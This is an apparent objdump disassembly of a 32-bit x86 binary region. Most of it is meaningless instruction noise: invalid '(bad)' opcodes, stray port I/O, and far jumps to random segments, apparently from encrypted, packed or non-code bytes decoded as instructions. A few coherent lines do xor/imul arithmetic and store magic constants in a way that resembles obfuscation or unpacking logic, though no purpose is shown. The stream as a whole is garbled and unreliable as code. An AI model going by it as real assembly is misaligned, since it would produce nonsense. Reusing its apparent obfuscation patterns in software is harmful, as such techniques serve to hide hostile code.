  40b9bd:	fwait
  40b9be:	mov    ch,0x1c
  40b9c0:	fstp   st(2)
  40b9c2:	mov    dh,0xac
  40b9c4:	les    edi,FWORD PTR [esi-0x71]
  40b9c7:	(bad)  
  40b9c8:	(bad)  
  40b9c9:	int    0x2
  40b9cb:	xchg   DWORD PTR [ecx-0x6bcb63f],esi
  40b9d1:	cwde   
  40b9d2:	cdq    
  40b9d3:	clc    
  40b9d4:	popa   
  40b9d5:	jb     0x40b9e3
  40b9d7:	and    al,0x91
  40b9d9:	add    DWORD PTR [ecx-0x7],0xffffffad
  40b9dd:	and    BYTE PTR [eax-0x43],ch
  40b9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e1:	or     BYTE PTR [ebx-0x1a],0xed
  40b9e5:	pushf  
  40b9e6:	pop    ebp
  40b9e7:	push   ecx
  40b9e8:	xlat   BYTE PTR ds:[ebx]
  40b9e9:	pop    ds
  40b9ea:	rcr    DWORD PTR [ebx+0x67bc839a],1
  40b9f0:	js     0x40b98b
  40b9f2:	(bad)  
  40b9f3:	or     eax,0x4a6cd721
  40b9f8:	or     eax,DWORD PTR [esi+0x19]
  40b9fb:	leave  
  40b9fc:	test   BYTE PTR [edx-0x1f],al
  40b9ff:	clc    
  40ba00:	out    0x6e,eax
  40ba02:	std    
  40ba03:	xlat   BYTE PTR ds:[ebx]
  40ba04:	mov    bl,0xd
  40ba06:	fisub  WORD PTR [esi+0x33]
  40ba09:	xlat   BYTE PTR ds:[ebx]
  40ba0a:	mov    WORD PTR [edx+edi*1],fs
  40ba0d:	call   0xa4cb:0x95c057c1
  40ba14:	xor    DWORD PTR [edx],edx
  40ba16:	jbe    0x40ba0f
  40ba18:	sbb    DWORD PTR [esi+0xd5346dd],edx
  40ba1e:	or     BYTE PTR [edx*1+0x33f6d133],cl
  40ba25:	ss outs dx,BYTE PTR ss:[esi]
  40ba28:	xchg   ecx,eax
  40ba29:	cmp    BYTE PTR [eax+0x1fdfc3cb],cl
  40ba2f:	mov    BYTE PTR [eax],bl
  40ba31:	pop    ebp
  40ba32:	xchg   esi,eax
  40ba33:	enter  0x72e3,0x24
  40ba37:	adc    esp,DWORD PTR [eax+0x156140f7]
  40ba3d:	sbb    edx,DWORD PTR [edi-0x40927ead]
  40ba43:	das    
  40ba44:	inc    esi
  40ba45:	sub    dl,cl
  40ba47:	loope  0x40b9e2
  40ba49:	daa    
  40ba4a:	and    BYTE PTR [ebp-0x6cff5f11],ah
  40ba50:	and    bh,BYTE PTR ds:0x557ddad9
  40ba56:	dec    esi
  40ba57:	sbb    al,0xdc
  40ba59:	mov    DWORD PTR [eax],esi
  40ba5b:	xchg   esp,eax
  40ba5c:	sti    
  40ba5d:	(bad)  
  40ba5e:	dec    DWORD PTR [eax+0x132a93aa]
  40ba64:	mov    esi,0x568dc84a
  40ba69:	push   eax
  40ba6a:	xor    BYTE PTR [ecx],bl
  40ba6c:	add    eax,DWORD PTR [edi+0xb]
  40ba6f:	cdq    
  40ba70:	ficomp WORD PTR [ecx-0x65c6b019]
  40ba76:	lahf   
  40ba77:	ss dec edx
  40ba79:	push   0xffffffcd
  40ba7b:	sbb    BYTE PTR [ebp+0x50],bl
  40ba7e:	(bad)  
  40ba7f:	fdiv   DWORD PTR [ebp-0x1649e800]
  40ba85:	(bad)  
  40ba86:	jl     0x40ba59
  40ba88:	fxch   st(3)
  40ba8a:	and    ecx,DWORD PTR [edi-0xf35527b]
  40ba90:	int    0x4e
  40ba92:	cmp    edx,esp
  40ba94:	mov    esi,0xa8bdccb1
  40ba99:	jp     0x40ba20
  40ba9b:	or     eax,0x29d27061
  40baa0:	add    bh,bh
  40baa2:	jmp    0xc788:0xdcea81cc
  40baa9:	in     eax,0x90
  40baab:	and    cl,BYTE PTR [ecx+0x5937107d]
  40bab1:	aad    0xba
  40bab3:	xor    DWORD PTR [ecx-0x4736fbe],esp
  40bab9:	or     al,0x12
  40babb:	adc    eax,eax
  40babd:	jg     0x40ba82
  40babf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bac0:	push   edi
  40bac1:	outs   dx,BYTE PTR ds:[esi]
  40bac2:	and    eax,0x8c02e721
  40bac7:	push   cs
  40bac8:	mov    ebp,DWORD PTR [edx]
  40baca:	loope  0x40baef
  40bacc:	and    al,0xc5
  40bace:	xchg   DWORD PTR [esi+0x35d40bd5],eax
  40bad4:	xchg   ebp,eax
  40bad5:	push   ebx
  40bad6:	xor    BYTE PTR [ecx+0x22],0x29
  40bada:	out    dx,al
  40badb:	xchg   ecx,eax
  40badc:	loope  0x40babd
  40bade:	aam    0xe2
  40bae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bae1:	std    
  40bae2:	xchg   ebx,eax
  40bae3:	push   edx
  40bae4:	(bad)  
  40bae5:	call   0xd0a5fb03
  40baea:	mov    bh,0xa7
  40baec:	jle    0x40baad
  40baee:	xor    al,0x33
  40baf0:	push   edi
  40baf1:	outs   dx,DWORD PTR ds:[esi]
  40baf2:	loopne 0x40ba9a
  40baf4:	or     bl,BYTE PTR [edx-0x16cd191d]
  40bafa:	xchg   esi,eax
  40bafb:	mov    ds:0x58ebfbf9,al
  40bb00:	cmp    eax,eax
  40bb02:	jmp    0x40bae2
  40bb04:	call   0x76427cd
  40bb09:	inc    edi
  40bb0a:	out    0x84,al
  40bb0c:	mov    edx,0x1eec150d
  40bb11:	push   esp
  40bb12:	push   es
  40bb13:	mov    al,0xbf
  40bb15:	ret    
  40bb16:	mov    ds:0xdfb441fc,eax
  40bb1b:	add    eax,0x72e4dd1a
  40bb20:	ret    0x33ae
  40bb23:	jle    0x40bae9
  40bb25:	popf   
  40bb26:	mov    WORD PTR [ecx-0x2b],es
  40bb29:	jl     0x40bbaa
  40bb2b:	(bad)  
  40bb2d:	xor    BYTE PTR [edi+0x16b2d1af],dh
  40bb33:	mov    ch,BYTE PTR [edi+0xcada7c1]
  40bb39:	nop
  40bb3a:	adc    BYTE PTR [edi],dh
  40bb3c:	repnz mov ah,0xa7
  40bb3f:	ret    0x80c7
  40bb42:	out    dx,al
  40bb43:	repz add BYTE PTR es:[eax+0x3d],bh
  40bb48:	jle    0x40bb7e
  40bb4a:	push   es
  40bb4b:	cmp    edi,edi
  40bb4d:	cli    
  40bb4e:	jecxz  0x40bb98
  40bb50:	and    bl,BYTE PTR [esi+0x3244e9bf]
  40bb56:	shr    DWORD PTR [eax],cl
  40bb58:	push   edx
  40bb59:	sahf   
  40bb5a:	and    ah,BYTE PTR [ebx+0x58]
  40bb5d:	icebp  
  40bb5e:	retf   0xfff5
  40bb61:	cld    
  40bb62:	dec    eax
  40bb63:	pop    ebp
  40bb64:	ss mov bl,0x33
  40bb67:	add    eax,0x78f0a390
  40bb6c:	inc    ecx
  40bb6d:	int3   
  40bb6e:	shr    BYTE PTR [ebx+eiz*4+0x5f3701aa],cl
  40bb75:	dec    ebx
  40bb76:	ins    BYTE PTR es:[edi],dx
  40bb77:	dec    edi
  40bb78:	inc    ecx
  40bb79:	enter  0x466a,0xe8
  40bb7d:	cld    
  40bb7e:	xchg   ebp,eax
  40bb7f:	fld    st(3)
  40bb81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb82:	repnz inc ebp
  40bb84:	push   esp
  40bb85:	call   0x6e7825d3
  40bb8a:	stc    
  40bb8b:	dec    ebp
  40bb8c:	iret   
  40bb8d:	inc    ecx
  40bb8e:	out    dx,al
  40bb8f:	push   es
  40bb90:	dec    eax
  40bb91:	mov    ds:0x76f75fb2,al
  40bb96:	cdq    
  40bb97:	and    al,0xb6
  40bb99:	cmp    DWORD PTR [ecx+0x67],ebx
  40bb9c:	mov    bh,0x4d
  40bb9e:	ror    bl,cl
  40bba0:	xor    BYTE PTR [ebx-0x51],0x67
  40bba4:	mov    esp,0xa86a1abf
  40bba9:	scas   eax,DWORD PTR es:[edi]
  40bbaa:	jmp    0x2c40:0x7362883a
  40bbb1:	hlt    
  40bbb2:	xchg   ebx,eax
  40bbb3:	addr16 mul ah
  40bbb6:	(bad)  
  40bbb9:	mov    ebx,0x6ad81513
  40bbbe:	mov    dl,0x47
  40bbc0:	ja     0x40bbb4
  40bbc2:	cwde   
  40bbc3:	cmp    al,BYTE PTR [edx]
  40bbc5:	pop    esp
  40bbc6:	lea    ebp,[ebx+0x4a]
  40bbc9:	(bad)  
  40bbca:	jne    0x40bb8c
  40bbcc:	xor    al,bl
  40bbce:	jmp    0x40bbc1
  40bbd0:	fisub  DWORD PTR [ebx]
  40bbd2:	jo     0x40bbcf
  40bbd4:	mov    dl,0x10
  40bbd6:	sahf   
  40bbd7:	pusha  
  40bbd8:	(bad)  
  40bbd9:	push   edx
  40bbda:	push   eax
  40bbdb:	test   al,0xcf
  40bbdd:	pop    esp
  40bbde:	jns    0x40bbe7
  40bbe0:	mov    bl,0xc9
  40bbe2:	out    0xf9,eax
  40bbe4:	rcr    BYTE PTR [eax+0x65],1
  40bbe7:	pushf  
  40bbe8:	aaa    
  40bbe9:	or     bh,dl
  40bbeb:	inc    eax
  40bbec:	enter  0x2af0,0x9b
  40bbf0:	in     al,0xd4
  40bbf2:	jle    0x40bc1e
  40bbf4:	push   ss
  40bbf5:	pushf  
  40bbf6:	xor    eax,0xdb51a6b2
  40bbfb:	or     DWORD PTR [eax+0x33],0xb1ec573c
  40bc02:	cmp    dh,ah
  40bc04:	call   0xc23c:0x70e46952
  40bc0b:	aad    0xc0
  40bc0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc0e:	ins    BYTE PTR es:[edi],dx
  40bc0f:	mov    WORD PTR ds:0xbc050005,ds
  40bc15:	bound  ebp,QWORD PTR [edi]
  40bc17:	add    BYTE PTR [eax+0x64],0x1a
  40bc1b:	dec    ebp
  40bc1c:	pop    edi
  40bc1d:	push   edx
  40bc1e:	fsubr  DWORD PTR [edx+ebx*1]
  40bc21:	jge    0x40bc24
  40bc23:	(bad)  
  40bc24:	mov    ebp,0xd984ed6b
  40bc29:	and    edx,ebp
  40bc2b:	nop
  40bc2c:	xchg   BYTE PTR [ebx*4+0x6e59606d],dh
  40bc33:	sub    al,0x9d
  40bc35:	das    
  40bc36:	inc    edx
  40bc37:	push   esi
  40bc38:	ins    BYTE PTR es:[edi],dx
  40bc39:	push   0xffffffe3
  40bc3b:	mov    ebp,0x8165db56
  40bc40:	call   0x7047:0x2d944fac
  40bc47:	mov    edi,0x4c6640a0
  40bc4c:	push   ds
  40bc4d:	inc    ebx
  40bc4e:	pop    ss
  40bc4f:	mov    ecx,0xc2457f3e
  40bc54:	mov    ebp,DWORD PTR [edi+0x5bfc4b70]
  40bc5a:	push   0x5a2bb3b1
  40bc5f:	adc    DWORD PTR [ebp-0x139f63b],edi
  40bc65:	pop    esi
  40bc66:	bound  ecx,QWORD PTR [ebp+0x199adcb]
  40bc6c:	mov    WORD PTR [edx+ecx*4],cs
  40bc6f:	lods   al,BYTE PTR ds:[esi]
  40bc70:	or     ebp,DWORD PTR [edi+ebp*8-0x37732a70]
  40bc77:	popa   
  40bc78:	aas    
  40bc79:	jg     0x40bc8c
  40bc7b:	jmp    0x40bcc0
  40bc7d:	btr    DWORD PTR es:[esi-0x1d6c9dd3],ebx
  40bc85:	mov    ecx,DWORD PTR [ebp+0x2c]
  40bc88:	mov    eax,0xdafc9855
  40bc8d:	mov    BYTE PTR [ecx],dh
  40bc8f:	jp     0x40bcec
  40bc91:	(bad)  
  40bc92:	enter  0x4f39,0xb6
  40bc96:	sbb    al,0xc5
  40bc98:	stc    
  40bc99:	mov    ebp,0xb20a2133
  40bc9e:	mov    ah,0x32
  40bca0:	pop    ebp
  40bca1:	dec    esi
  40bca2:	imul   ecx,ebp,0xffffffb8
  40bca5:	push   edx
  40bca6:	fiadd  WORD PTR [esp+esi*2+0x2ba4911d]
  40bcad:	in     eax,0x48
  40bcaf:	mov    ah,0x84
  40bcb1:	or     BYTE PTR [ebp+0x6faf69a3],al
  40bcb7:	xchg   DWORD PTR [ecx-0x1db40ae1],ecx
  40bcbd:	les    eax,FWORD PTR [ebx]
  40bcbf:	mov    esp,0xaa90aa33
  40bcc4:	imul   al
  40bcc6:	xor    BYTE PTR [edi],cl
  40bcc8:	test   BYTE PTR [eax+0x416efc26],ah
  40bcce:	rcl    ah,0xb9
  40bcd1:	mov    esi,0x355b693d
  40bcd6:	sub    eax,0xb773f8df
  40bcdb:	mov    DWORD PTR [eax],edx
  40bcdd:	aam    0x3e
  40bcdf:	aaa    
  40bce0:	or     bh,BYTE PTR [eax+edx*2-0x4b]
  40bce4:	sbb    BYTE PTR [edi-0x30808c52],dh
  40bcea:	cmc    
  40bceb:	jle    0x40bd65
  40bced:	lahf   
  40bcee:	mov    edi,0xfc049096
  40bcf3:	jmp    0x40bc80
  40bcf5:	pop    ebp
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ch,BYTE PTR [esi-0x70586379]
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd90
  40bd4b:	add    ah,BYTE PTR [ebx+0x2d8351ad]
  40bd51:	sbb    ah,ah
  40bd53:	mov    ebp,0x9be90383
  40bd58:	inc    ecx
  40bd59:	or     BYTE PTR [edx-0x437ff34b],0x9e
  40bd60:	or     al,0x2e
  40bd62:	stc    
  40bd63:	fbstp  TBYTE PTR ds:0x8aca1a5e
  40bd69:	scas   al,BYTE PTR es:[edi]
  40bd6a:	xor    DWORD PTR [edi],ecx
  40bd6c:	fcmovnu st,st(4)
  40bd6e:	adc    cl,BYTE PTR [edi]
  40bd70:	ds push ebp
  40bd72:	cmp    ecx,DWORD PTR [ecx-0x7e19cff4]
  40bd78:	mov    cl,0xd8
  40bd7a:	retf   0x453d
  40bd7d:	outs   dx,BYTE PTR ds:[esi]
  40bd7e:	data16 and BYTE PTR [ebp-0x454a5ba8],bh
  40bd85:	push   ecx
  40bd86:	daa    
  40bd87:	push   esi
  40bd88:	cdq    
  40bd89:	mov    ebx,0x85fb3572
  40bd8e:	or     ecx,0x3d
  40bd91:	clc    
  40bd92:	fwait
  40bd93:	jno    0x40bd6d
  40bd95:	iret   
  40bd96:	fcmovbe st,st(2)
  40bd98:	mov    ds:0x9d99b2f1,al
  40bd9d:	or     BYTE PTR [edi-0x52],0x98
  40bda1:	(bad)  
  40bda2:	jle    0x40be07
  40bda4:	and    edi,0x9ae637f5
  40bdaa:	sbb    DWORD PTR [ebx],ebx
  40bdac:	fsub   QWORD PTR [edi-0x18]
  40bdaf:	outs   dx,DWORD PTR ds:[esi]
  40bdb0:	pop    esp
  40bdb1:	jl     0x40bd71
  40bdb3:	sti    
  40bdb4:	sahf   
  40bdb5:	aad    0xf2
  40bdb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdb8:	pop    ds
  40bdb9:	and    eax,0x2907e55d
  40bdbe:	dec    ebp
  40bdbf:	xlat   BYTE PTR ds:[ebx]
  40bdc0:	jb     0x40bd4c
  40bdc2:	lods   eax,DWORD PTR ds:[esi]
  40bdc3:	into   
  40bdc4:	inc    esi
  40bdc5:	fsub   DWORD PTR [edi-0x32]
  40bdc8:	pop    edx
  40bdc9:	add    eax,edi
  40bdcb:	mov    eax,ds:0xef640fe5
  40bdd0:	test   al,0x3d
  40bdd2:	or     al,0x59
  40bdd4:	mov    esp,0xbcdd4050
  40bdd9:	mov    cl,ah
  40bddb:	imul   esp,DWORD PTR [edx-0xaeec4c0],0xffffffdc
  40bde2:	jmp    0x456e17c7
  40bde7:	inc    esp
  40bde8:	je     0x40bd8f
  40bdea:	rol    dh,cl
  40bdec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bded:	mov    edx,0x9553ad63
  40bdf2:	fnstsw ax
  40bdf4:	int3   
  40bdf5:	jno    0x40bdbd
  40bdf7:	inc    ebp
  40bdf8:	std    
  40bdf9:	pusha  
  40bdfa:	and    al,0xbe
  40bdfc:	jmp    0x88071bb8
  40be01:	and    eax,0xf734e882
  40be06:	ret    0xf378
  40be09:	or     DWORD PTR [eax+0xb85cfee],edx
  40be0f:	mov    dl,0x53
  40be11:	popa   
  40be12:	sbb    eax,0x881f9e47
  40be17:	push   eax
  40be18:	jge    0x40be2b
  40be1a:	adc    bh,BYTE PTR [edi-0x79]
  40be1d:	cli    
  40be1e:	mov    DWORD PTR [ecx],eax
  40be20:	(bad)  
  40be21:	neg    esp
  40be23:	jge    0x40be01
  40be25:	jecxz  0x40be1f
  40be27:	xchg   DWORD PTR [eax+0x2917a597],ebp
  40be2d:	xchg   BYTE PTR [ecx+0x5c],ch
  40be30:	dec    ecx
  40be31:	and    DWORD PTR [edx],ecx
  40be33:	sti    
  40be34:	sahf   
  40be35:	pushf  
  40be36:	adc    ch,BYTE PTR [eax+0x46389b7d]
  40be3c:	jp     0x40bde4
  40be3e:	and    eax,0x1dd35cba
  40be43:	xchg   edx,eax
  40be44:	out    0xd2,eax
  40be46:	pop    esp
  40be47:	and    bl,BYTE PTR [esi+0x71e148a8]
  40be4d:	ja     0x40bea5
  40be4f:	call   0x33158c65
  40be54:	lods   al,BYTE PTR ds:[esi]
  40be55:	jne    0x40be06
  40be57:	xchg   ebp,eax
  40be58:	adc    edx,0x219dabaa
  40be5e:	(bad)
  40be61:	adc    ebx,DWORD PTR [esi+0x547a0193]
  40be67:	or     al,dl
  40be69:	dec    eax
  40be6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be6b:	imul   edi,DWORD PTR [ecx],0x11bd3f85
  40be71:	test   BYTE PTR [ebx+esi*8+0x55],bl
  40be75:	push   0x2c
  40be77:	xor    DWORD PTR [esi],esi
  40be79:	scas   eax,DWORD PTR es:[edi]
  40be7a:	dec    edi
  40be7b:	lods   eax,DWORD PTR ds:[esi]
  40be7c:	inc    esi
  40be7d:	rol    DWORD PTR [ebx-0x7946cc41],cl
  40be83:	rcl    esi,0x10
  40be86:	(bad)  
  40be87:	clc    
  40be88:	mov    ds:0xa854942c,al
  40be8d:	mov    bh,0x3
  40be8f:	mov    ds:0x8471e0f1,al
  40be94:	cmp    al,0x2a
  40be96:	dec    ebp
  40be97:	jp     0x40be65
  40be99:	repnz mov dl,0xa4
  40be9c:	ins    DWORD PTR es:[edi],dx
  40be9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be9e:	jge    0x40be6b
  40bea0:	imul   ebx,DWORD PTR [eax-0x26db66f0],0xe2511546
  40beaa:	add    edi,DWORD PTR [edx]
  40beac:	jecxz  0x40be59
  40beae:	jno    0x40be79
  40beb0:	push   esi
  40beb1:	jne    0x40bf2a
  40beb3:	call   0x1666cb0a
  40beb8:	sahf   
  40beb9:	leave  
  40beba:	mov    bl,0x86
  40bebc:	dec    eax
  40bebd:	clc    
  40bebe:	(bad)  
  40bebf:	in     eax,dx
  40bec0:	jle    0x40bf3f
  40bec2:	sbb    al,0xf8
  40bec4:	push   ss
  40bec5:	pop    ebx
  40bec6:	pop    eax
  40bec7:	xchg   edx,eax
  40bec8:	adc    eax,edi
  40beca:	mov    bl,0xc7
  40becc:	jnp    0x40be9f
  40bece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40becf:	mov    WORD PTR [ebp-0x55528141],cs
  40bed5:	mov    DWORD PTR [edi-0x74],0xf11a6eff
  40bedc:	xor    esp,DWORD PTR [edx-0x5b]
  40bedf:	lds    eax,FWORD PTR [esi]
  40bee1:	addr16 pop ebx
  40bee3:	fcomp  DWORD PTR [ebx]
  40bee5:	sub    al,0x26
  40bee7:	dec    ebp
  40bee8:	mov    bh,0x27
  40beea:	xor    al,0xab
  40beec:	aas    
  40beed:	adc    bl,BYTE PTR [edi+0x48]
  40bef0:	or     eax,0x97426e5d
  40bef5:	sub    ch,BYTE PTR [esi+0x71]
  40bef8:	push   ds
  40bef9:	addr16 dec ebx
  40befb:	mul    BYTE PTR [ebp-0x6486b16d]
  40bf01:	out    dx,al
  40bf02:	test   BYTE PTR [esi-0x49],ah
  40bf05:	jmp    0x60ca7f45
  40bf0a:	repnz mov al,cs:0xad4ba54
  40bf11:	jp     0x40be97
  40bf13:	adc    esp,DWORD PTR [ebp+0x55]
  40bf16:	rcr    DWORD PTR [edx+0x74b38a6f],1
  40bf1c:	(bad)  
  40bf1d:	pushf  
  40bf1e:	adc    cl,BYTE PTR ds:[esp+eiz*8+0x1b]
  40bf23:	sub    eax,0x7f224e7e
  40bf28:	push   ecx
  40bf29:	lods   al,BYTE PTR ds:[esi]
  40bf2a:	mov    ebp,0xf0732e30
  40bf2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf30:	and    cl,al
  40bf32:	xor    esi,DWORD PTR [edx+ebx*8+0xee1a737]
  40bf39:	dec    eax
  40bf3a:	jecxz  0x40bf57
  40bf3c:	daa    
  40bf3d:	sub    cl,ah
  40bf3f:	push   cs
  40bf40:	out    dx,al
  40bf41:	jae    0x40bf62
  40bf43:	in     al,0xa1
  40bf45:	sub    bh,BYTE PTR [ebx+0x343bf50b]
  40bf4b:	or     edx,eax
  40bf4d:	cmp    BYTE PTR ds:0xc352ba9c,bl
  40bf53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf54:	loop   0x40bf4e
  40bf56:	pop    ebx
  40bf57:	out    dx,al
  40bf58:	mov    esi,0x42a5b203
  40bf5d:	inc    esi
  40bf5e:	js     0x40beeb
  40bf60:	icebp  
  40bf61:	js     0x40bf49
  40bf63:	adc    al,BYTE PTR [ecx-0x47]
  40bf66:	mov    ch,BYTE PTR [ebx]
  40bf68:	lds    edx,FWORD PTR [edi+0x62]
  40bf6b:	bnd jmp 0x40bf8e
  40bf6e:	pop    edx
  40bf6f:	loopne 0x40bef9
  40bf71:	adc    ecx,esp
  40bf73:	loope  0x40bf28
  40bf75:	jne    0x40bfc4
  40bf77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf78:	or     BYTE PTR [ebx+edi*4+0x1f2d1205],dh
  40bf7f:	fcmove st,st(3)
  40bf81:	stos   BYTE PTR es:[edi],al
  40bf82:	jecxz  0x40bf4a
  40bf84:	hlt    
  40bf85:	lods   eax,DWORD PTR ds:[esi]
  40bf86:	sbb    BYTE PTR [ebp+0x23],ch
  40bf89:	or     edi,DWORD PTR [ebp-0x267683b8]
  40bf8f:	push   ds
  40bf90:	inc    ebx
  40bf91:	mov    WORD PTR [ebx+0x7dd35e69],fs
  40bf97:	mov    BYTE PTR [eax],al
  40bf99:	sbb    al,0x3
  40bf9b:	ror    DWORD PTR [eax-0x7],cl
  40bf9e:	das    
  40bf9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfa0:	jb     0x40bf42
  40bfa2:	mov    dh,0x38
  40bfa4:	and    al,BYTE PTR [edx+eax*8]
  40bfa7:	adc    eax,0xf55a2a54
  40bfac:	leave  
  40bfad:	clc    
  40bfae:	lock es stc 
  40bfb1:	pop    es
  40bfb2:	sbb    DWORD PTR [eax-0x60],esp
  40bfb5:	and    ebx,DWORD PTR [esp+esi*1]
  40bfb8:	out    0x8c,al
  40bfba:	retf   0x9b56
  40bfbd:	(bad)  
  40bfbe:	(bad)  
  40bfbf:	xor    ebx,eax
  40bfc1:	ins    DWORD PTR es:[edi],dx
  40bfc2:	fwait
  40bfc3:	out    0x98,al
  40bfc5:	dec    ebp
  40bfc6:	in     al,0x81
  40bfc8:	adc    DWORD PTR [edx-0x5e],0x44
  40bfcc:	loope  0x40c006
  40bfce:	aam    0x1
  40bfd0:	push   ds
  40bfd1:	sub    al,dl
  40bfd3:	adc    al,0x8b
  40bfd5:	bound  edx,QWORD PTR [ebx+0x3fc46602]
  40bfdb:	xchg   ebx,eax
  40bfdc:	jmp    0x9ce61747
  40bfe1:	daa    
  40bfe2:	gs cmc 
  40bfe4:	jns    0x40c065
  40bfe6:	iret   
  40bfe7:	loopne 0x40c01a
  40bfe9:	jb     0x40bf78
  40bfeb:	les    edx,FWORD PTR [edi+0x64]
  40bfee:	pop    dx
  40bff0:	xchg   edx,eax
  40bff1:	ficomp WORD PTR [edx+0x6322fd05]
  40bff7:	xchg   ecx,eax
  40bff8:	in     al,dx
  40bff9:	pop    ebp
  40bffa:	imul   esp,DWORD PTR [ebx+0x5e],0x88aa4351
  40c001:	mov    DWORD PTR [edx],esi
  40c003:	test   BYTE PTR [edi-0x52],dl
  40c006:	inc    ecx
  40c007:	dec    edx
  40c008:	inc    esp
  40c009:	mov    al,ds:0x5233416c
  40c00e:	push   es
  40c00f:	add    eax,0x807d3e92
  40c014:	call   0x77b06971
  40c019:	fisubr DWORD PTR [edx]
  40c01b:	dec    ecx
  40c01c:	adc    esi,0xffffffa6
  40c01f:	jl     0x40c027
  40c021:	xchg   edx,eax
  40c022:	jmp    0x75d9670b
  40c027:	mov    eax,0x653a48cf
  40c02c:	dec    edi
  40c02d:	(bad)  
  40c02e:	test   eax,0x3beb6004
  40c033:	call   0x32c2:0x1a5d36e
  40c03a:	mov    ebx,0xe2946104
  40c03f:	inc    ebx
  40c040:	xor    dl,BYTE PTR [eax]
  40c042:	loope  0x40c0aa
  40c044:	mov    bh,0x12
  40c046:	push   ebx
  40c047:	push   cs
  40c048:	(bad)  
  40c049:	bound  esi,QWORD PTR [esi]
  40c04b:	sbb    eax,DWORD PTR [ecx+edi*8-0x19]
  40c04f:	(bad)
  40c053:	and    DWORD PTR [ebx+0x6e],0xffffffce
  40c057:	inc    ecx
  40c058:	mov    BYTE PTR [edx-0x3512d0b6],al
  40c05e:	pop    eax
  40c05f:	gs add edi,ebx
  40c062:	jge    0x40c007
  40c064:	cmc    
  40c065:	add    eax,0xb93991d4
  40c06a:	into   
  40c06b:	cwde   
  40c06c:	inc    dx
  40c06e:	test   ebp,esp
  40c070:	test   BYTE PTR [eax-0x29],0x75
  40c074:	sub    DWORD PTR [edi+0x37df3d19],0x6b
  40c07b:	pop    ds
  40c07c:	mov    al,BYTE PTR [ecx+edx*2]
  40c07f:	nop
  40c080:	push   0xffffff99
  40c082:	jg     0x40c04b
  40c084:	inc    edi
  40c085:	repz or DWORD PTR [ebx+0x775e7f66],edi
  40c08c:	inc    ecx
  40c08d:	pop    ecx
  40c08e:	popf   
  40c08f:	sahf   
  40c090:	out    0xb5,al
  40c092:	inc    ebx
  40c093:	hlt    
  40c094:	loope  0x40c020
  40c096:	xlat   BYTE PTR ds:[ebx]
  40c097:	int    0xee
  40c099:	pop    ss
  40c09a:	mov    bl,0xbf
  40c09c:	shl    BYTE PTR fs:[edx+eiz*4-0x2c],1
  40c0a1:	(bad)  
  40c0a3:	or     al,0x12
  40c0a5:	repnz rcr DWORD PTR [ecx+0x6f],1
  40c0a9:	cmc    
  40c0aa:	test   al,0xa2
  40c0ac:	dec    esi
  40c0ad:	cmc    
  40c0ae:	jle    0x40c102
  40c0b0:	jge    0x40c06b
  40c0b2:	adc    ecx,DWORD PTR [ecx-0x23acaf51]
  40c0b8:	mov    ecx,0xa7215b24
  40c0bd:	dec    edi
  40c0be:	sub    BYTE PTR [eax-0x3a],dl
  40c0c1:	or     al,BYTE PTR [ebp+0x49f4fdef]
  40c0c7:	popa   
  40c0c8:	dec    edx
  40c0c9:	jb     0x40c12f
  40c0cb:	add    DWORD PTR [ebp-0x3d5b4c34],ebx
  40c0d1:	retf   
  40c0d2:	in     al,dx
  40c0d3:	push   ecx
  40c0d4:	hlt    
  40c0d5:	rcl    BYTE PTR [esi],cl
  40c0d7:	(bad)  
  40c0d8:	pushf  
  40c0d9:	adc    eax,0x6aa9c8ef
  40c0de:	lods   eax,DWORD PTR ds:[esi]
  40c0df:	(bad)  [esi-0x7315296b]
  40c0e5:	pop    ebx
  40c0e6:	adc    al,0x72
  40c0e8:	and    ah,BYTE PTR [ebp-0x3baa74be]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
